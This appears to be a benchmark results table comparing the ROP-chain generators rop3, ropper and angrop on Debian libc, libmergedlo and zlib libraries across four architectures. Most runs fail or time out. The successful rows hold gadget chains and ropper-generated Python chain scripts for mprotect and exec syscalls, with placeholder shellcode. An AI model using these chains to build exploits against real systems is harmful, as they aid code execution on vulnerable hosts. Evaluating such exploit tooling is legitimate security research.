tool	library	arch	chain	found	seconds	status	chain_text
rop3	libc_debian_riscv.so	riscv64	syscall_exec_riscv	True	11.7186	found	[libc_debian_riscv.so @ 0xb5e94]: [90mld ra, 0x418(sp)[0m ; ld s0, 0x410(sp) ; addi sp, sp, 0x420 ; [90mc.jr ra[0m [93m(modifies ra)[0m\n[libc_debian_riscv.so @ 0x35c98]: [90mc.ldsp ra, 8(sp)[0m ; c.mv a0, s0 ; c.ldsp s0, 0(sp) ; c.addi sp, 0x10 ; [90mc.jr ra[0m (x24) [93m(modifies s0, ra)[0m\n[libc_debian_riscv.so @ 0xb5e94]: [90mld ra, 0x418(sp)[0m ; ld s0, 0x410(sp) ; addi sp, sp, 0x420 ; [90mc.jr ra[0m [93m(modifies ra)[0m\n[libc_debian_riscv.so @ 0x3532a]: [90mc.ldsp ra, 0x38(sp)[0m ; c.mv a1, s0 ; c.ldsp s0, 0x30(sp) ; c.ldsp s2, 0x20(sp) ; c.ldsp s3, 0x18(sp) ; c.ldsp s4, 0x10(sp) ; c.ldsp s5, 8(sp) ; c.ldsp s6, 0(sp) ; c.mv a0, s1 ; c.ldsp s1, 0x28(sp) ; c.addi16sp sp, 0x40 ; [90mc.jr ra[0m [93m(modifies s6, a0, s3, s4, s2, ra, s0, s1, s5)[0m\n[libc_debian_riscv.so @ 0x447ee]: [90mld ra, 0x458(sp)[0m ; ld s0, 0x450(sp) ; ld s1, 0x448(sp) ; addi sp, sp, 0x460 ; [90mc.jr ra[0m [93m(modifies s0, ra)[0m\n[libc_debian_riscv.so @ 0x5af94]: c.ldsp a0, 8(sp) ; [90mc.ldsp ra, 0x18(sp)[0m ; c.addi16sp sp, 0x20 ; [90mc.jr ra[0m [93m(modifies ra)[0m\n[libc_debian_riscv.so @ 0xb01fe]: c.sd a0, 8(s1) ; [90mc.ldsp ra, 0x28(sp)[0m ; c.ldsp s0, 0x20(sp) ; c.ldsp s1, 0x18(sp) ; c.ldsp s2, 0x10(sp) ; c.ldsp s3, 8(sp) ; c.addi16sp sp, 0x30 ; [90mc.jr ra[0m [93m(modifies s3, s2, s0, ra)[0m\n[libc_debian_riscv.so @ 0x591f6]: c.ld a2, 0(s1) ; c.ld a3, 8(s1) ; c.ld a4, 0x10(s1) ; c.ld a5, 0x20(s0) ; sd s1, 0x1c8(s0) ; [90mc.ldsp ra, 0x18(sp)[0m ; c.sd a2, 0xf8(s0) ; sd a3, 0x100(s0) ; sd a4, 0x108(s0) ; c.sd a5, 0x18(s0) ; c.sd a5, 8(s0) ; c.sd a5, 0x10(s0) ; c.ldsp s0, 0x10(sp) ; c.ldsp s1, 8(sp) ; c.addi16sp sp, 0x20 ; [90mc.jr ra[0m [93m(modifies a4, ra, s0, s1, a3, a5)[0m\n[libc_debian_riscv.so @ 0x94cd0]: addi a7, zero, 0xdd ; ecall [93m(modifies a7)[0m
ropper	libc_debian_riscv.so	riscv64	syscall_exec_riscv	False		unsupported	
angrop	libc_debian_x86.so	x86	mprotect_x86	False		error	
rop3	libc_debian_x86.so	x86	mprotect_x86	True	10.5696	found	[libc_debian_x86.so @ 0x2e11b]: pop ebx ; [90mret[0m (x1052)\n[libc_debian_x86.so @ 0x393cb]: pop ecx ; pop edx ; [90mret[0m [93m(modifies edx)[0m\n[libc_debian_x86.so @ 0x393cc]: pop edx ; [90mret[0m\n[libc_debian_x86.so @ 0x32289]: pop eax ; [90mret[0m (x12)
ropper	libc_debian_x86.so	x86	mprotect_x86	True	15.8686	found	[*] Try permuation 1 / 24\n\n\n\n#!/usr/bin/env python\n# Generated by ropper ropchain generator #\nfrom struct import pack\n\np = lambda x : pack('I', x)\n\nshellcode = '\\xcc'*100\n\nIMAGE_BASE_0 = 0x00000000 # 021029ebcd56f03b077149ffa0bf16bb631be48a92b9b10fb5040a271b66a620\nrebase_0 = lambda x : p(x + IMAGE_BASE_0)\n\n\nrop = ''\nrop += rebase_0(0x0002e11b) # 0x0002e11b: pop ebx; ret; \nrop += p(0x00001000)\nrop += rebase_0(0x00098020) # 0x00098020: pop ecx; add al, 0xf6; ret; \nrop += p(0x00001000)\nrop += rebase_0(0x000393cc) # 0x000393cc: pop edx; ret; \nrop += p(0x00000007)\nrop += rebase_0(0x00032289) # 0x00032289: pop eax; ret; \nrop += p(0x0000007d)\n\n# ADD HERE SYSCALL GADGET\n\nrop += rebase_0(0x00030ed7) # 0x00030ed7: push esp; ret; \nrop += shellcode\n\nprint(rop)
angrop	libc_debian_x86.so	x86	syscall_exec_x86	False		error	
rop3	libc_debian_x86.so	x86	syscall_exec_x86	True	12.8943	found	[libc_debian_x86.so @ 0x23725]: pop esi ; [90mret[0m (x607)\n[libc_debian_x86.so @ 0x23a5d]: pop edi ; [90mret[0m (x846)\n[libc_debian_x86.so @ 0x13df22]: mov dword ptr [edi], esi ; pop ebx ; pop esi ; pop edi ; [90mret[0m (x3) [93m(modifies esi, ebx)[0m\n[libc_debian_x86.so @ 0x23725]: pop esi ; [90mret[0m (x607)\n[libc_debian_x86.so @ 0x23a5d]: pop edi ; [90mret[0m (x846)\n[libc_debian_x86.so @ 0x13df22]: mov dword ptr [edi], esi ; pop ebx ; pop esi ; pop edi ; [90mret[0m (x3) [93m(modifies esi, ebx)[0m\n[libc_debian_x86.so @ 0x23725]: pop esi ; [90mret[0m (x607)\n[libc_debian_x86.so @ 0x23a5d]: pop edi ; [90mret[0m (x846)\n[libc_debian_x86.so @ 0x13df22]: mov dword ptr [edi], esi ; pop ebx ; pop esi ; pop edi ; [90mret[0m (x3) [93m(modifies esi, ebx)[0m\n[libc_debian_x86.so @ 0x2e11b]: pop ebx ; [90mret[0m (x1052)\n[libc_debian_x86.so @ 0x393cb]: pop ecx ; pop edx ; [90mret[0m [93m(modifies edx)[0m\n[libc_debian_x86.so @ 0x393cc]: pop edx ; [90mret[0m\n[libc_debian_x86.so @ 0x32289]: pop eax ; [90mret[0m (x12)
ropper	libc_debian_x86.so	x86	syscall_exec_x86	False	13.7721	not-found	
angrop	libmergedlo_debian_aarch64.so	aarch64	mprotect_aarch64	False		unsupported	
rop3	libmergedlo_debian_aarch64.so	aarch64	mprotect_aarch64	False	60.2206	timeout	
ropper	libmergedlo_debian_aarch64.so	aarch64	mprotect_aarch64	False		unsupported	
angrop	libmergedlo_debian_aarch64.so	aarch64	syscall_exec_aarch64	False		unsupported	
rop3	libmergedlo_debian_aarch64.so	aarch64	syscall_exec_aarch64	False	60.1758	timeout	
ropper	libmergedlo_debian_aarch64.so	aarch64	syscall_exec_aarch64	False		unsupported	
angrop	libmergedlo_debian_amd64.so	x86_64	mprotect_amd64	False		error	
rop3	libmergedlo_debian_amd64.so	x86_64	mprotect_amd64	False	60.1735	timeout	
ropper	libmergedlo_debian_amd64.so	x86_64	mprotect_amd64	False	60.0861	timeout	
angrop	libmergedlo_debian_amd64.so	x86_64	syscall_exec_amd64	False		error	
rop3	libmergedlo_debian_amd64.so	x86_64	syscall_exec_amd64	False	60.2473	timeout	
ropper	libmergedlo_debian_amd64.so	x86_64	syscall_exec_amd64	False	60.1271	timeout	
angrop	libmergedlo_debian_amd64.so	x86_64	turing_amd64	False		unsupported	
rop3	libmergedlo_debian_amd64.so	x86_64	turing_amd64	False	60.3535	timeout	
ropper	libmergedlo_debian_amd64.so	x86_64	turing_amd64	False		unsupported	
angrop	libmergedlo_debian_riscv.so	riscv64	mprotect_riscv	False		unsupported	
rop3	libmergedlo_debian_riscv.so	riscv64	mprotect_riscv	False	60.2384	timeout	
ropper	libmergedlo_debian_riscv.so	riscv64	mprotect_riscv	False		unsupported	
angrop	libmergedlo_debian_riscv.so	riscv64	syscall_exec_riscv	False		unsupported	
rop3	libmergedlo_debian_riscv.so	riscv64	syscall_exec_riscv	False	60.2037	timeout	
ropper	libmergedlo_debian_riscv.so	riscv64	syscall_exec_riscv	False		unsupported	
angrop	zlib1g_aarch64_libz.so.1	aarch64	mprotect_aarch64	False		unsupported	
rop3	zlib1g_aarch64_libz.so.1	aarch64	mprotect_aarch64	False	0.6641	not-found	
ropper	zlib1g_aarch64_libz.so.1	aarch64	mprotect_aarch64	False		unsupported	
angrop	zlib1g_aarch64_libz.so.1	aarch64	syscall_exec_aarch64	False		unsupported	
rop3	zlib1g_aarch64_libz.so.1	aarch64	syscall_exec_aarch64	False	1.3416	not-found	
ropper	zlib1g_aarch64_libz.so.1	aarch64	syscall_exec_aarch64	False		unsupported	
angrop	zlib1g_amd64_libz.so.1	x86_64	mprotect_amd64	False		error	
rop3	zlib1g_amd64_libz.so.1	x86_64	mprotect_amd64	False	1.5157	not-found	
ropper	zlib1g_amd64_libz.so.1	x86_64	mprotect_amd64	True	3.0381	found	[*] Try permuation 1 / 24\n[*] Try permuation 2 / 24\n[*] Try permuation 3 / 24\n[*] Try permuation 4 / 24\n[*] Try permuation 5 / 24\n[*] Try permuation 6 / 24\n[*] Try permuation 7 / 24\n[*] Try permuation 8 / 24\n[*] Try permuation 9 / 24\n[*] Try permuation 10 / 24\n[*] Try permuation 11 / 24\n[*] Try permuation 12 / 24\n[*] Try permuation 13 / 24\n[*] Try permuation 14 / 24\n[*] Try permuation 15 / 24\n[*] Try permuation 16 / 24\n[*] Try permuation 17 / 24\n[*] Try permuation 18 / 24\n[*] Try permuation 19 / 24\n[*] Try permuation 20 / 24\n[*] Try permuation 21 / 24\n[*] Try permuation 22 / 24\n[*] Try permuation 23 / 24\n[*] Try permuation 24 / 24\n\n\n\n\n\n\n#!/usr/bin/env python\n# Generated by ropper ropchain generator #\nfrom struct import pack\n\np = lambda x : pack('Q', x)\n\nshellcode = '\\xcc'*100\n\nIMAGE_BASE_0 = 0x0000000000000000 # 800f3150ab353d8c6692fb8fbcec5443819cae58ee0cafec0bb9ea1a09730fa0\nrebase_0 = lambda x : p(x + IMAGE_BASE_0)\n\n\nrop = ''\n# Filled registers: rdi, rsi, \nrop += rebase_0(0x0000000000007230) # 0x0000000000007230: pop rdi; ret; \nrop += p(0x0000000000001000)\nrop += rebase_0(0x0000000000006f42) # 0x0000000000006f42: pop rsi; ret; \nrop += p(0x0000000000001000)\n\n# ADD HERE SYSCALL GADGET\n\nrop += rebase_0(0x000000000000a215) # 0x000000000000a215: call rsp; \nrop += shellcode\n\nprint(rop)
angrop	zlib1g_amd64_libz.so.1	x86_64	syscall_exec_amd64	False		error	
rop3	zlib1g_amd64_libz.so.1	x86_64	syscall_exec_amd64	False	2.0163	not-found	
ropper	zlib1g_amd64_libz.so.1	x86_64	syscall_exec_amd64	False	2.0997	not-found	
angrop	zlib1g_amd64_libz.so.1	x86_64	turing_amd64	False		unsupported	
rop3	zlib1g_amd64_libz.so.1	x86_64	turing_amd64	False	3.6132	not-found	
ropper	zlib1g_amd64_libz.so.1	x86_64	turing_amd64	False		unsupported	
angrop	zlib1g_riscv_libz.so.1	riscv64	mprotect_riscv	False		unsupported	
rop3	zlib1g_riscv_libz.so.1	riscv64	mprotect_riscv	False	1.9233	not-found	
ropper	zlib1g_riscv_libz.so.1	riscv64	mprotect_riscv	False		unsupported	
angrop	zlib1g_riscv_libz.so.1	riscv64	syscall_exec_riscv	False		unsupported	
rop3	zlib1g_riscv_libz.so.1	riscv64	syscall_exec_riscv	False	2.2502	not-found	
ropper	zlib1g_riscv_libz.so.1	riscv64	syscall_exec_riscv	False		unsupported	
angrop	zlib1g_x86_libz.so.1	x86	mprotect_x86	False		error	
rop3	zlib1g_x86_libz.so.1	x86	mprotect_x86	False	0.6157	not-found	
ropper	zlib1g_x86_libz.so.1	x86	mprotect_x86	True	1.057	found	[*] Try permuation 1 / 24\n[*] Try permuation 2 / 24\n[*] Try permuation 3 / 24\n[*] Try permuation 4 / 24\n[*] Try permuation 5 / 24\n[*] Try permuation 6 / 24\n[*] Try permuation 7 / 24\n[*] Try permuation 8 / 24\n[*] Try permuation 9 / 24\n[*] Try permuation 10 / 24\n[*] Try permuation 11 / 24\n[*] Try permuation 12 / 24\n[*] Try permuation 13 / 24\n[*] Try permuation 14 / 24\n[*] Try permuation 15 / 24\n[*] Try permuation 16 / 24\n[*] Try permuation 17 / 24\n[*] Try permuation 18 / 24\n[*] Try permuation 19 / 24\n[*] Try permuation 20 / 24\n[*] Try permuation 21 / 24\n[*] Try permuation 22 / 24\n[*] Try permuation 23 / 24\n[*] Try permuation 24 / 24\n\n\n\n\n#!/usr/bin/env python\n# Generated by ropper ropchain generator #\nfrom struct import pack\n\np = lambda x : pack('I', x)\n\nshellcode = '\\xcc'*100\n\nIMAGE_BASE_0 = 0x00000000 # f34523e22249c7fb2d6b84e7935ee0c8afd74c0bdf409833c40f22869f9ecf01\nrebase_0 = lambda x : p(x + IMAGE_BASE_0)\n\n\nrop = ''\n# Filled registers: ebx, \nrop += rebase_0(0x0000201e) # 0x0000201e: pop ebx; ret; \nrop += p(0x00001000)\n\n# ADD HERE SYSCALL GADGET\n\n\n# ADD HERE JMP ESP\n\nrop += shellcode\n\nprint(rop)
angrop	zlib1g_x86_libz.so.1	x86	syscall_exec_x86	False		error	
rop3	zlib1g_x86_libz.so.1	x86	syscall_exec_x86	False	1.4431	not-found	
ropper	zlib1g_x86_libz.so.1	x86	syscall_exec_x86	False	0.9523	not-found	
